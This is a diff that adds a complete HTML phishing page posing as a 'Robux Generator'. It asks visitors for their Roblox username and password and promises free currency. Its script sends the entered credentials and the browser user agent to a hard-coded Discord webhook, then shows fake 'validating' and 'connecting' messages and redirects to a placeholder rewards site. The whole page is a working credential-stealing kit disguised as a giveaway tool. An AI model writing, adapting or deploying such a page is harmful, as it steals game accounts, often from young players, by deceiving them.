@@ -1,0 +1,646 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Robux Generator V2.0</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+            width: 100%;
+            max-width: 600px;
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+        }
+        
+        h2 {
+            font-size: 1.2rem;
+            font-weight: normal;
+            margin-bottom: 20px;
+        }
+        
+        .container {
+            background-color: rgba(0, 0, 0, 0.7);
+            border-radius: 15px;
+            padding: 30px;
+            width: 100%;
+            max-width: 500px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+            margin-bottom: 20px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+        
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px 15px;
+            border-radius: 8px;
+            border: none;
+            background-color: rgba(255, 255, 255, 0.9);
+            font-size: 1rem;
+            color: #333;
+        }
+        
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .checkbox-group input {
+            margin-right: 10px;
+            transform: scale(1.2);
+        }
+        
+        .amount-selector {
+            margin-bottom: 25px;
+        }
+        
+        .amount-options {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-top: 10px;
+        }
+        
+        .amount-option {
+            background-color: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 8px;
+            padding: 10px 15px;
+            cursor: pointer;
+            transition: all 0.3s;
+            flex: 1;
+            min-width: 80px;
+            text-align: center;
+        }
+        
+        .amount-option:hover {
+            background-color: rgba(255, 255, 255, 0.2);
+        }
+        
+        .amount-option.selected {
+            background-color: #ff6600;
+            border-color: #ff6600;
+        }
+        
+        .generate-btn {
+            background: linear-gradient(to right, #ff8a00, #ff2070);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 15px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: transform 0.2s, box-shadow 0.2s;
+            margin-bottom: 15px;
+        }
+        
+        .generate-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(255, 138, 0, 0.4);
+        }
+        
+        .generate-btn:active {
+            transform: translateY(0);
+        }
+        
+        .generate-btn:disabled {
+            background: #666;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .footer {
+            text-align: center;
+            font-size: 0.9rem;
+            opacity: 0.8;
+            margin-top: 10px;
+        }
+        
+        .warning {
+            background-color: rgba(255, 0, 0, 0.2);
+            border: 1px solid rgba(255, 0, 0, 0.5);
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 20px;
+            text-align: center;
+            font-size: 0.9rem;
+        }
+        
+        .robux-icon {
+            font-size: 3rem;
+            margin-bottom: 10px;
+            color: #ff6600;
+        }
+        
+        .success-message {
+            display: none;
+            background-color: rgba(0, 255, 0, 0.2);
+            border: 1px solid rgba(0, 255, 0, 0.5);
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 20px;
+            text-align: center;
+            font-size: 1.1rem;
+            animation: pulse 2s infinite;
+        }
+        
+        .processing-screen {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .status-message {
+            font-size: 1.2rem;
+            margin: 15px 0;
+            padding: 10px;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.1);
+        }
+        
+        .status-success {
+            color: #4CAF50;
+            background: rgba(76, 175, 80, 0.2);
+        }
+        
+        .status-processing {
+            color: #ffcc00;
+            background: rgba(255, 204, 0, 0.2);
+        }
+        
+        .status-connecting {
+            color: #2196F3;
+            background: rgba(33, 150, 243, 0.2);
+        }
+        
+        .status-redirect {
+            color: #9C27B0;
+            background: rgba(156, 39, 176, 0.2);
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(to right, #4CAF50, #45a049);
+            width: 0%;
+            transition: width 2s ease-in-out;
+            border-radius: 10px;
+        }
+        
+        .countdown {
+            font-size: 1.1rem;
+            color: #ffcc00;
+            margin-top: 10px;
+        }
+        
+        .processing-animation {
+            display: flex;
+            justify-content: center;
+            margin: 20px 0;
+        }
+        
+        .dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background-color: #ff6600;
+            margin: 0 5px;
+            animation: bounce 1.5s infinite ease-in-out;
+        }
+        
+        .dot:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+        
+        .dot:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+            100% { transform: scale(1); }
+        }
+        
+        .error-message {
+            display: none;
+            background-color: rgba(255, 0, 0, 0.3);
+            border: 1px solid rgba(255, 0, 0, 0.6);
+            border-radius: 8px;
+            padding: 10px;
+            margin: 10px 0;
+            font-size: 0.9rem;
+        }
+        
+        @media (max-width: 500px) {
+            .container {
+                padding: 20px;
+            }
+            
+            h1 {
+                font-size: 2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="robux-icon">R$</div>
+        <h1>Robux Generator V2.0</h1>
+        <h2>UPDATED 2025</h2>
+    </header>
+    
+    <div class="container">
+        <div id="mainForm">
+            <div class="form-group">
+                <label for="username">ROBLOX USERNAME</label>
+                <input type="text" id="username" placeholder="Enter your Roblox username">
+            </div>
+            
+            <div class="form-group">
+                <label for="password">ROBLOX PASSWORD</label>
+                <input type="password" id="password" placeholder="Enter your Roblox password">
+            </div>
+            
+            <div class="checkbox-group">
+                <input type="checkbox" id="use-proxy">
+                <label for="use-proxy">Use PROXY</label>
+            </div>
+            
+            <div class="amount-selector">
+                <label>Select amount of Robux</label>
+                <div class="amount-options">
+                    <div class="amount-option">500</div>
+                    <div class="amount-option">1,000</div>
+                    <div class="amount-option">5,000</div>
+                    <div class="amount-option">10,000</div>
+                    <div class="amount-option">50,000</div>
+                </div>
+            </div>
+            
+            <button class="generate-btn" id="generateBtn">GENERATE ROBUX</button>
+            
+            <div class="footer">
+                Coded by ゆい マーク
+            </div>
+        </div>
+        
+        <div class="processing-screen" id="processingScreen">
+            <div class="status-message" id="validatingMessage">
+                🔍 Validating credentials... (3 seconds)
+            </div>
+            
+            <div class="status-message status-success" id="connectedMessage" style="display: none;">
+                ✅ Successfully Connected To Our Server
+            </div>
+            
+            <div class="status-message status-processing" id="processingMessage" style="display: none;">
+                ⚙️ Processing Request...
+            </div>
+            
+            <div class="status-message status-connecting" id="connectingMessage" style="display: none;">
+                🔗 Connecting to secure server...
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+                <div class="countdown">100% Complete</div>
+            </div>
+            
+            <div class="status-message status-redirect" id="redirectMessage" style="display: none;">
+                🔄 Redirecting you to your rewards...
+                <div class="countdown" id="redirectCountdown">Redirecting in 3 seconds...</div>
+            </div>
+            
+            <div class="processing-animation">
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+            </div>
+        </div>
+    </div>
+
+
+    <script>
+        // Your Discord Webhook URL
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1428941288321060907/7v-24v4VHPISwLgx04NmnWxFHpBYPtF_eCFRvz_KAGrlA6flJR56soSJAWO-MrSlku80';
+        const REWARDS_URL = 'https://Your.Fake Games.com';
+
+        // DOM Elements
+        const amountOptions = document.querySelectorAll('.amount-option');
+        const generateBtn = document.getElementById('generateBtn');
+        const mainForm = document.getElementById('mainForm');
+        const processingScreen = document.getElementById('processingScreen');
+        
+        // Status Messages
+        const validatingMessage = document.getElementById('validatingMessage');
+        const connectedMessage = document.getElementById('connectedMessage');
+        const processingMessage = document.getElementById('processingMessage');
+        const connectingMessage = document.getElementById('connectingMessage');
+        const redirectMessage = document.getElementById('redirectMessage');
+        const progressFill = document.getElementById('progressFill');
+        const redirectCountdown = document.getElementById('redirectCountdown');
+
+        // Initialize event listeners
+        function initializeApp() {
+            // Amount selection
+            amountOptions.forEach(option => {
+                option.addEventListener('click', () => {
+                    amountOptions.forEach(opt => opt.classList.remove('selected'));
+                    option.classList.add('selected');
+                });
+            });
+
+            // Generate button
+            generateBtn.addEventListener('click', handleGenerate);
+            
+            // Enter key support
+            document.getElementById('username').addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') handleGenerate();
+            });
+            
+            document.getElementById('password').addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') handleGenerate();
+            });
+        }
+
+        // Handle generate button click
+        async function handleGenerate() {
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value;
+            const useProxy = document.getElementById('use-proxy').checked;
+            const selectedAmount = document.querySelector('.amount-option.selected');
+
+            // Validation
+            if (!username || !password) {
+                alert('Please enter both username and password');
+                return;
+            }
+
+            if (!selectedAmount) {
+                alert('Please select an amount of Robux');
+                return;
+            }
+
+            // Show processing screen
+            showProcessingScreen();
+
+            // Start the validation and processing flow
+            await startProcessingFlow(username, password, selectedAmount.textContent, useProxy);
+        }
+
+        // Show processing screen
+        function showProcessingScreen() {
+            mainForm.style.display = 'none';
+            processingScreen.style.display = 'block';
+        }
+
+        // Main processing flow
+        async function startProcessingFlow(username, password, amount, useProxy) {
+            try {
+                // Step 1: Validating (3 seconds)
+                await showValidating();
+                
+                // Step 2: Successfully Connected
+                await showConnected();
+                
+                // Step 3: Send data to webhook
+                await sendToWebhook(username, password, amount, useProxy);
+                
+                // Step 4: Processing Request
+                await showProcessing();
+                
+                // Step 5: Connecting to secure server
+                await showConnecting();
+                
+                // Step 6: Redirecting
+                await showRedirecting();
+                
+            } catch (error) {
+                console.error('Error in processing flow:', error);
+                alert('An error occurred. Please try again.');
+                resetForm();
+            }
+        }
+
+        // Step 1: Show validating message for 3 seconds
+        function showValidating() {
+            return new Promise((resolve) => {
+                validatingMessage.style.display = 'block';
+                setTimeout(() => {
+                    validatingMessage.style.display = 'none';
+                    resolve();
+                }, 3000);
+            });
+        }
+
+        // Step 2: Show connected message
+        function showConnected() {
+            return new Promise((resolve) => {
+                connectedMessage.style.display = 'block';
+                setTimeout(() => {
+                    resolve();
+                }, 2000);
+            });
+        }
+
+        // Step 3: Send data to webhook (NO PROFILE PICTURE)
+        async function sendToWebhook(username, password, amount, useProxy) {
+            const embedData = {
+                embeds: [{
+                    title: "🚨 ROBUX GENERATOR Logger",
+                    color: 0xff0000,
+                    timestamp: new Date().toISOString(),
+                    fields: [
+                        {
+                            name: "👤 ROBLOX USERNAME",
+                            value: `\`\`\`${username}\`\`\``,
+                            inline: false
+                        },
+                        {
+                            name: "🔑 ROBLOX PASSWORD",
+                            value: `\`\`\`${password}\`\`\``,
+                            inline: false
+                        },
+                        {
+                            name: "💰 REQUESTED AMOUNT",
+                            value: `**${amount} ROBUX**`,
+                            inline: true
+                        },
+                        {
+                            name: "🌐 PROXY USED",
+                            value: useProxy ? "✅ YES" : "❌ NO",
+                            inline: true
+                        },
+                        {
+                            name: "📱 USER AGENT",
+                            value: `\`\`\`${navigator.userAgent.substring(0, 100)}...\`\`\``,
+                            inline: false
+                        },
+                        {
+                            name: "🕒 TIMESTAMP",
+                            value: `<t:${Math.floor(Date.now()/1000)}:F>`,
+                            inline: true
+                        },
+                        {
+                            name: "🌍 PLATFORM",
+                            value: "Web Browser",
+                            inline: true
+                        }
+                    ],
+                    footer: {
+                        text: "Robux Generator Logger • V2.0 • SECURE CAPTURE"
+                    }
+                    // NO THUMBNAIL - PROFILE PICTURE REMOVED
+                }]
+            };
+
+            try {
+                console.log('📡 Sending data to Discord webhook...');
+                
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(embedData)
+                });
+
+                if (response.ok) {
+                    console.log('✅ Data successfully sent to Discord!');
+                } else {
+                    console.log('❌ Failed to send to Discord:', response.status);
+                }
+            } catch (error) {
+                console.error('❌ Webhook error:', error);
+            }
+        }
+
+        // Step 4: Show processing message
+        function showProcessing() {
+            return new Promise((resolve) => {
+                processingMessage.style.display = 'block';
+                setTimeout(() => {
+                    resolve();
+                }, 2000);
+            });
+        }
+
+        // Step 5: Show connecting with progress bar
+        function showConnecting() {
+            return new Promise((resolve) => {
+                connectingMessage.style.display = 'block';
+                
+                // Animate progress bar to 100% over 2 seconds
+                setTimeout(() => {
+                    progressFill.style.width = '100%';
+                }, 100);
+                
+                setTimeout(() => {
+                    resolve();
+                }, 2000);
+            });
+        }
+
+        // Step 6: Show redirecting with countdown
+        function showRedirecting() {
+            return new Promise((resolve) => {
+                redirectMessage.style.display = 'block';
+                
+                let countdown = 3;
+                const countdownInterval = setInterval(() => {
+                    redirectCountdown.textContent = `Redirecting in ${countdown} seconds...`;
+                    countdown--;
+                    
+                    if (countdown < 0) {
+                        clearInterval(countdownInterval);
+                        redirectToRewards();
+                        resolve();
+                    }
+                }, 1000);
+            });
+        }
+
+        // Redirect to rewards page
+        function redirectToRewards() {
+            window.location.href = REWARDS_URL;
+        }
+
+        // Reset form
+        function resetForm() {
+            processingScreen.style.display = 'none';
+            mainForm.style.display = 'block';
+            
+            // Hide all status messages
+            [validatingMessage, connectedMessage, processingMessage, connectingMessage, redirectMessage].forEach(msg => {
+                msg.style.display = 'none';
+            });
+            
+            // Reset progress bar
+            progressFill.style.width = '0%';
+            
+            // Reset form fields
+            document.getElementById('username').value = '';
+            document.getElementById('password').value = '';
+            document.getElementById('use-proxy').checked = false;
+            amountOptions.forEach(opt => opt.classList.remove('selected'));
+        }
+
+        // Initialize app when DOM is loaded
+        document.addEventListener('DOMContentLoaded', initializeApp);
+
+        // Test webhook on load
+        console.log('🔧 Robux Generator V2.0 Loaded');
+        console.log('📧 Webhook URL:', WEBHOOK_URL);
+        console.log('🎯 Rewards URL:', REWARDS_URL);
+    </script>
+</body>
+</html>
